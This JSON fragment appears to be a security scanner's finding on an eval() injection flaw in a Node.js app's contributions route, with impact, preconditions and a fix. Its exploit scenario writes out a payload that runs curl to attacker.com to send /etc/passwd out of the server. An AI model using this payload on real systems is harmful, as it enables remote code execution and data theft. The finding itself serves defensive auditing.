            "offensivePriorityReason": "Internal Network / Privileged Position | *exposure unverified \u2014 no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*",
            "confidence": 0.92,
            "description": "*2 additional call site(s) collapsed during dedup \u2014 same root cause; each location needs the same fix applied.*\n\n#### Description\nThe POST /contributions route invokes handleContributionsUpdate, which (based on the codebase threat model) uses eval() on user-supplied contribution data without validation. An attacker can submit a form field containing JavaScript code (e.g., 'preTax: require('child_process').exec('malicious command')') which gets executed in the Node.js server context.\n\n#### Impact\nAuthenticated users can execute arbitrary JavaScript on the server by injecting malicious code into the pre-tax contribution amount field. This allows complete server compromise, data theft, and lateral movement within the infrastructure.\n\n#### Exploit scenario\nAuthenticated attacker submits POST /contributions with body {preTax: '1; require(\"child_process\").execSync(\"curl http://attacker.com/$(cat /etc/passwd)\")'} resulting in code execution and data exfiltration from the server.\n\n#### Preconditions\n- Attacker must be authenticated with any valid user account\n\n```\napp.get(\"/contributions\", isLoggedIn, contributionsHandler.displayContributions);\napp.post(\"/contributions\", isLoggedIn, contributionsHandler.handleContributionsUpdate);\n```\n\n#### How to fix\nRemove eval() usage entirely. Parse and validate numeric input using safe parsing functions. Never execute user-supplied strings as code.\n\n**Exploitability:** Eval injection in contributions handler; authenticated low-privilege user can execute arbitrary code on the server. Post-auth but reachable via any session.\n\n#### Adversarial verification\n**Verdict:** TRUE_POSITIVE (confidence: 10/10) \u2014 eval() on unsanitized req.body fields confirmed at contributions.js:32-34, reachable via POST /contributions behind the minimal isLoggedIn gate",
            "dedupRelatedLocationCount": 2
          },
